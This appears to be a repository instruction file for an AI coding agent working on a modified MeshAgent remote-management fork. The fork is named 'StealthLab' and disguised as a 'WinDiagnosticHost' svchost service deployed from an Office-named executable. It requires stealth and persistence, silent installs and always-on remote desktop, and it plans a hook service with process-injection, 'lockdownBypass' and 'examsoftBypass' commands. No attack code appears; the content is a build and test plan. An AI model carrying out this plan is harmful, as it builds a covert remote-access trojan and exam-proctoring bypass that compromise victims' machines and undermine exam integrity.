# Repository Guidelines

## Project Structure & Module Organization
- `meshcore/` hosts the cross-platform agent runtime; generated headers live in `meshcore/generated/`.
- `meshservice/` contains Windows service projects, with `MeshService-2022` carrying the svchost and standalone builds (`StealthLab`, `StealthLab_DLL`).
- `modules/` contains JavaScript runtime modules (installer/service manager logic lives here).
- `docs/testing/` stores validation evidence, plans, and packaged artifacts (`docs/testing/artifacts/`).

## Build, Test, and Development Commands
- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m` - build the svchost payload DLL.
- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=x64 /m` - build the standalone executable.

## Implementation Constraints (Must Follow)
- Implement install/uninstall/update logic in native C/C++ and JavaScript only.
- Do not use PowerShell scripts for install/uninstall/update or regression testing.
- Do not add new PowerShell scripts for these workflows.
- Legacy PowerShell tooling may exist in `tools/`, but it is not to be used for runtime logic or test automation.

## Engineering Quality Bar (Non-Negotiable)
- No shortcuts, hacks, temporary fixes, or workarounds.
- No technical debt, code smells, regressions, or hidden edge-case failures.
- Fix root causes holistically; consider dependencies and side effects.
- Logic must be defensive, secure, maintainable, and production-ready.
- Include proper validation, error handling, logging, and observability.
- Explicitly consider performance, reliability, and future extensibility.
- Treat all work as production-critical; anticipate failure modes and edge cases.
- Implement end-to-end fixes comprehensively; do not ship partial solutions.

## Install & Logs
- Install root: `C:\ProgramData\DiagnosticHost`
- Log root: `C:\ProgramData\DiagnosticHost\logs`
- Installer log: `C:\ProgramData\DiagnosticHost\logs\installer.log`
## Connectivity Inputs
- `.msh` source: `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` (extract and stage for installs/updates).
- The agent must connect to the configured server using the staged `.msh` (ServerID + TLS hash).
## Runtime Scope (Must Support)
- Service mode only (no interactive user-mode installs).
- Installer must support silent/quiet non-interactive deployment mode for service installs/updates.
- Disable standalone agent execution; only svchost service mode is allowed.
- Remote desktop (KVM/RDP) must always be available when the service is running.
- Terminal and file operations are expected to work, but are not part of routine regression unless investigating a major bug.
- Stealth/persistence features must remain enabled and validated end-to-end.
- Server connectivity must be established after install/update and persist across restarts.

## Functional Requirements (Must Enforce)
- Install/uninstall/update must correctly handle registry entries, firewall rules, DACLs, and persistence artifacts.
- Silent/quiet install mode must complete end-to-end with the same registry/firewall/DACL/persistence guarantees as interactive flows.
- PowerShell-invoked install entry must be supported for operators, but it must call native installer code paths only (no PowerShell runtime/install logic).
- Agent must run only in service mode using svchost.
- Remote desktop (KVM/RDP) session availability must be continuous while the service is running, including after restart and update.
- Terminal access and file operations are verified only when investigating major bugs or regressions.
- Failures in any of the above are regressions and must block completion.

## Coding Style & Naming Conventions
- C/C++ sources follow 4-space indentation, all-lowercase file names with underscores, and brace-on-same-line (see `meshservice/stealth_installer.c`).
- JavaScript follows existing project style (see `modules/service-manager.js`).
- Generated branding files (`branding_config*.json`, `meshagent_branding.h`) should not be hand-edited; use existing tooling under `tools/` if needed.

## Testing Guidelines
- Provide end-to-end regression coverage for install/uninstall/update, including registry, firewall, DACL, persistence behavior, WMI, and agent network persistence.
- Include silent/quiet install and PowerShell-invoked install entrypoint validation in regression coverage.
- Validate service-only behavior, svchost mode, and server connectivity/handshake using the staged `.msh` (ServerID/TLS hash).
- Do not run routine KVM/RDP/WebRTC/terminal/file transfer checks; only run them when investigating a major bug or regression.
- Session checks are disabled by default in `agent-selftest`; use `--majorBug=1` only when explicitly investigating major bugs.
- Do not alter terminal/KVM/remote desktop runtime behavior unless explicitly requested.
- Prefer native C/C++ validation helpers and JS harnesses over scripts.
- Store validation evidence in `docs/testing/` and packaged artifacts in `docs/testing/artifacts/`.
- Regression must explicitly prove install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and svchost-only service mode.

## Advanced Debugging & Harness (Required)
- Use all locally available advanced debugging/diagnostic tooling for deep bug analysis, regression, and stress validation.
- If required tools are missing or stale, install/upgrade them before debugging using package-managed updates (do not skip tool refresh).
- Mandatory refresh/install commands:
- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- Native primary target path: `meshservice\x64\StealthLab\MeshService-2022.exe` (install/update/uninstall/validate/fullregression entrypoint).
- Svchost payload path: `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`.
- Installer validation binary path: `meshservice\installer\dist\x64\MeshServiceInstaller64.exe`.
- JS regression harness path: `modules\agent-selftest.js`.
- Update stress harness path: `test\update-test.js`.
- Current local advanced tooling paths:
- `C:\Users\Workstation\AppData\Local\Microsoft\WindowsApps\WinDbgX.exe`
- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\Procmon.exe`
- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\procdump.exe`
- `C:\Windows\System32\wpr.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\wpa.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xperf.exe`
- `C:\Windows\System32\PktMon.exe`
- `C:\Windows\System32\netsh.exe`
- Authoritative advanced debugging workflow reference: `docs/testing/ADVANCED_DEBUG_TOOLCHAIN.md`.
- Legacy docs under `docs/testing/*.md` are historical context only and may be outdated; do not treat them as authoritative for current debugging/regression.
- Record run commands, parameters, and outcomes for each debug/regression/stress run under `docs/testing/`.
- Evidence/log output paths must include `docs/testing/native-regression.log`, `docs/testing/native-install.log`, `docs/testing/evidence/`, `docs/testing/artifacts/`, and `C:\ProgramData\DiagnosticHost\logs\installer.log`.

## End-to-End Fix Plan (Must Complete)
1. Audit current install/uninstall/update paths for bugs, gaps, and code smells (registry, firewall, DACL, persistence, service mode).
2. Implement native C/C++ fixes for all identified gaps (no PowerShell usage in runtime logic).
3. Implement native validation commands: install, update, uninstall, and service-state validation (registry + firewall + DACL + persistence + service configuration).
4. Extract `.msh` payload from `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` and validate it against the runtime expectations.
5. Ensure install/update staging logic writes the `.msh` (and `.conf`) into the install root and preserves ServerID/TLS hash.
6. Wire JS regression harness to drive full install → validate → restart → server-connect → update → validate → uninstall → validate sequence, covering WMI, persistence, registry, firewall, network persistence, and svchost-only service mode.
7. Ensure logging and JSON evidence capture for each phase under `docs/testing/`.
8. Run full end-to-end regression and attach evidence (no stopping before tests pass).

## Execution Rules
- Do not stop work until all fixes are implemented and full regression is executed.
- No PowerShell scripts or PowerShell execution in install/uninstall/update/regression paths.
- Completion is blocked until service-only svchost mode, install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and server connectivity pass end-to-end.

## Commit & Pull Request Guidelines
- Use concise, imperative subjects (`Fix svchost service creation`) and include context in the body where necessary (reasoning, risk, testing).
- Reference tracking issues with `Fixes #ID` when applicable, and attach updated evidence or artifact links in the PR description.
- PRs should include: summary, testing steps/outputs, and any required operator actions (e.g., service restart).

## Security & Operational Notes
- Always validate binaries with `tools/SignerAllowlist.ps1` before publishing; unauthorized certificates must be blocked.
- Deployment actions touch `HKLM` and firewall rules—run only from elevated shells and document logs for traceability.
- Before packaging releases, export the latest evidence bundle (`docs/testing/artifacts/*.zip`) and attach it to the GitHub release for downstream auditors.
- Mirror release hand-offs with the quick checklist in `docs/files/meshagent_release_checklist.md` and attach verification artifacts (verify-log/report, digests) to each deployment record.

## Audit Record (2026-02-25)
- Tool refresh commands executed:
- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- Result: toolchains already current (no newer package versions available from configured sources).
- Native self-test/harness fixes completed:
- `modules/agent-selftest.js`: restored stable remote `toAgent` routing via console/eval path for remote IPC commands.
- `modules/agent-selftest.js`: fixed tunnel promise ownership race by using `_owner` for queue cleanup and removing conflicting `parent` overwrite in `testTunnel`.
- `modules/agent-selftest.js`: added defensive tunnel send failure handling (`send-failed`) to prevent hung tunnel promises.
- `modules/agent-selftest.js`: made LMS no-AMT resolution asynchronous to avoid intermittent promise-chain stalls after `testLMS [N/A]`.
- `meshcore/agentcore.c`: self-test flag handling is now case-safe (`selfTest` and `selftest`) and cleared before execution to prevent re-entrant duplicate self-test runs.
- `meshcore/agentcore.c`: added in-memory `selfTestLaunched` one-shot guard to block repeated self-test re-entry from reconnect paths.
- `meshcore/agentcore.c`: self-test now stages `agent-selftest.js` for the currently running executable path before loading, preventing `Module: agent-selftest (NOT FOUND)` on repo-binary self-test runs.
- `meshcore/agentcore.c`: `--selftest` now prefers the installed runtime `.db` path in read-only mode (with local fallback), preventing stale dev-db `CoreModule` parse failures during repo-binary major-bug diagnostics.
- Latest passing native full regression evidence:
- `docs/testing/evidence/advanced/20260225_051820_fullregression_final_after_uninstall_exit_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_074058_fullregression_post_selftest_stage_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_075039_fullregression_post_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_075540_fullregression_post_const_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_080058_fullregression_post_warning_fix/summary.txt` (`EXIT_CODE=0`).
- CLI coverage evidence (help/install/update/uninstall/validation/svchost):
- `docs/testing/evidence/advanced/20260225_051440_cli_coverage_final_post_uninstall_exit_fix/summary.txt` (`ALL_OK=True`).
- `docs/testing/evidence/advanced/20260225_072604_cli_coverage_live/summary.txt` (`ALL_OK=True`).
- Major-bug session/KVM verification evidence:
- `docs/testing/evidence/advanced/20260225_050932_majorbug_post_timeout_hardening/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_074721_majorbug_repoexe_after_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
- Runtime state after final install restore:
- `docs/testing/evidence/advanced/20260225_052102_final_runtime_restore_final/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_074412_final_runtime_restore_post_selftest_stage_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_075316_final_runtime_restore_post_dbpath_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_075819_final_runtime_restore_post_const_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_080347_final_runtime_restore_post_warning_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `-validate-install` passed and `-svchost-status` confirms `WinDiagnosticHost` running in svchost mode (`netsvcs`, `ServiceDllHash match: yes`).

## Service-Only Master Plan (Non-Desktop) - 2026-02-25
- Objective: enforce service-only execution for all install/update/uninstall/runtime control paths, persistence, networking, and management features.
- Constraint: interactive desktop capture/control cannot be implemented as pure user-mode Session 0 logic on modern Windows; any desktop bridge must be explicit, isolated, and auditable.
- Quality target: zero policy ambiguity, zero silent fallbacks, zero hidden session-crossing behavior outside the explicit desktop bridge boundary.

### Architecture Policy
- Session 0 is the authoritative runtime for all core subsystems.
- No non-desktop subsystem may spawn or dispatch into user sessions.
- Any user-session transition must be desktop-feature-scoped, explicit, and disabled by default unless policy enables it.
- Service startup must fail fast on invalid policy state rather than degrade silently.
- Policy decisions must be observable in logs and validation output.

### Runtime Policy Controls
- `STEALTH_STRICT_SERVICE_ONLY=1|0`:
  Enforce strict service-only policy for non-desktop runtime paths. Default: enabled.
- `STEALTH_ALLOW_DESKTOP_BRIDGE=1|0`:
  Permit explicit desktop bridge session spawning when strict policy is enabled. Default: disabled.
- `STEALTH_ENABLE_HELPER_MONITOR=1|0`:
  Enable helper monitor only when policy allows desktop bridge. Default: disabled.

### Implementation Program
1. Policy Surface Consolidation
- Centralize service-only policy evaluation in native startup.
- Remove implicit defaults that enable session helpers from unrelated features.
- Require explicit enablement flags for any desktop bridge path.
2. Runtime Spawn Governance
- Add a single native spawn-governance layer that classifies process launches as `service-only` or `desktop-bridge`.
- Block launches that target user sessions unless classified as approved desktop bridge.
- Emit structured denial logs with reason, caller, session target, and command line hash.
3. Non-Desktop Subsystem Hardening
- Audit updater, installer, watchdog, WMI, scheduler, IPC, terminal, and file operations for session crossing.
- Convert any legacy cross-session code to service-context implementations.
- Add defensive parameter validation and deterministic error codes for all blocked cross-session attempts.
4. Desktop Bridge Isolation
- Keep desktop bridge code physically separated from core service paths.
- Enforce minimal API surface between service core and desktop bridge.
- Require explicit runtime marker and telemetry for each bridge activation.
5. Install/Update/Uninstall Integrity
- Preserve registry, firewall, DACL, persistence, and svchost invariants under strict service-only policy.
- Ensure policy state persists correctly through reinstall, update, and reboot cycles.
- Prevent update rollback into policy-incompatible binaries.
6. Observability and Evidence
- Extend installer/native logs with policy decisions and spawn-governance outcomes.
- Capture machine-readable evidence snapshots under `docs/testing/evidence/`.
- Add explicit policy-state fields to validation JSON outputs.
7. Regression and Stress Validation
- Add strict service-only regression profile to native validation entrypoints.
- Prove no unauthorized session-targeted process creation under stress/restart/update churn.
- Validate network persistence and management channel continuity under strict policy.
8. Release Controls
- Block release when any strict-policy gate fails.
- Require evidence bundle with logs, policy snapshots, and regression summaries.
- Require signed-binary verification and digest publication for each release artifact.

### Acceptance Gates (Must Pass)
- Gate 1: install/update/uninstall succeed with strict policy enabled.
- Gate 2: svchost-only service validation succeeds and persists across reboot.
- Gate 3: no unauthorized user-session process spawn events are observed.
- Gate 4: registry/firewall/DACL/persistence/WMI/task state are correct before and after update.
- Gate 5: connectivity and handshake persistence remain stable across restart and update.
- Gate 6: all policy decisions are present in logs and machine-readable evidence.

### Engineering Rules for This Program
- No shortcuts, temporary fixes, or hidden compatibility shims.
- No policy bypasses by script wrappers, environment side channels, or undocumented flags.
- No silent fallback to weaker behavior.
- All code must be deterministic, auditable, and production-safe under failure conditions.

## Remote Desktop Always-Ready Master Plan (2026-02-26)
- Authoritative implementation/testing reference: `docs/testing/REMOTE_DESKTOP_ALWAYS_READY_MASTER_PLAN.md`.
- Objective: keep remote desktop session path continuously ready while service is running, including across restart and update.
- Runtime model:
- Primary path: `PRIMARY_INMEM` (in-memory session startup in service runtime).
- Fallback path: `RAMAS` (`Resilient Agent Managed Alternate Session`) for deterministic failover.
- Required behavior:
- No silent degradation; all failovers/recovery decisions must be logged and evidenced.
- Restart/update may not leave runtime without at least one ready session path.
- Recovery must be bounded-time and idempotent (no hangs, no infinite retry loops).

### Remote Desktop Validation Gates (Must Pass)
- Gate R1: `restart` must exit 0 and service must return `RUNNING`.
- Gate R2: post-restart major-bug validation must pass:
- `meshservice\x64\StealthLab\MeshService-2022.exe --selfTest=1 --serviceName="WinDiagnosticHost" --majorBug=1`
- Gate R3: `-fullregression` must pass with clean end-to-end install/update/uninstall state validation.
- Gate R4: final restore checks must pass:
- `-fullinstall`, `-validate-install`, `-svchost-status`, and `sc query WinDiagnosticHost`.
- Gate R5: evidence package must include commands, logs, summaries, and readiness/failover outcomes under `docs/testing/evidence/advanced/`.

### Release Blockers (Remote Desktop)
- Any restart hang, timeout-driven session loss, or missing fallback activation when primary path fails.
- Any regression where major-bug self-test loses KVM readiness/availability.
- Any build with missing remote-desktop evidence for restart/update continuity.

## UserModeHook Control Pipeline Master Plan (2026-02-26)
- Objective: integrate UserModeHook `MasterService` control server + IPC pipeline with MeshAgent runtime and MeshCentral operator workflows.
- Scope: service-only mode, svchost deployment, no PowerShell runtime/install logic, deterministic install/update/uninstall behavior.

### Cross-Repo Architecture
- MeshCentral UI and console workflows issue `umhctl` commands.
- MeshCentral agent core (`agents/meshcore.js`) resolves/validates UMH requests and sends JSON to `\\.\pipe\{95c1a2e0-f84e-4c8a-9c32}-control`.
- UserModeHook `MasterService` handles control requests (`status`, `listProcesses`, `inject*`, `telemetry`, `policy/config`, `lockdownBypass`, `examsoftBypass`).
- MeshAgent native install/update/uninstall stages and governs `MasterService.exe` lifecycle in lockstep with agent lifecycle.

### Install/Update/Uninstall Requirements
1. Stage `MasterService.exe` into install root (`C:\ProgramData\DiagnosticHost`) during `-fullinstall` and `-fullupdate`.
2. Run deterministic service commands in native path:
- install/update path: `--install --silent --wait --timeout <N> --output json`
- uninstall path: `--quit ...` then `--uninstall ...`
3. Require service verification gate:
- service `AdvancedHookService` must reach `RUNNING` after install/update
- service must be absent after uninstall
4. Require control-pipe verification gate:
- named pipe connect + `{"op":"status"}` must return `"ok":true` after install/update
5. Block completion if any gate fails.

### Packaging Strategy (Agent + MasterService)
- Primary: same-directory packaging where `MasterService.exe` ships beside MeshAgent payload and is staged into install root.
- Fallback discovery for engineering builds may resolve from sibling `UserModeHook` repo build outputs.
- Runtime toggle/override:
- `--masterservice-source="...\\MasterService.exe"` to force source path
- `--masterservice=0|1` to disable/enable native integration gates (default `1`)

### MeshCentral Operator UX Requirements
- Add Device Console controls (dropdown + PID/json fields + run button) for UMH requests.
- Keep raw console support for advanced requests (`umhctl --json "<payload>"`).
- Ensure command output returns structured JSON to console for auditability.

### Regression Gates (Must Pass)
- Gate U1: `-fullinstall` passes with `AdvancedHookService` running and UMH control `status` probe passing.
- Gate U2: post-restart and post-update regression preserves both agent connectivity and UMH control-pipe readiness.
- Gate U3: MeshCentral console command path (`umhctl`) can execute representative control operations end-to-end.
- Gate U4: `-fulluninstall` removes both MeshAgent and MasterService service artifacts cleanly.
- Gate U5: evidence/logs captured under `docs/testing/` (`native-install.log`, `native-regression.log`, advanced evidence snapshots).
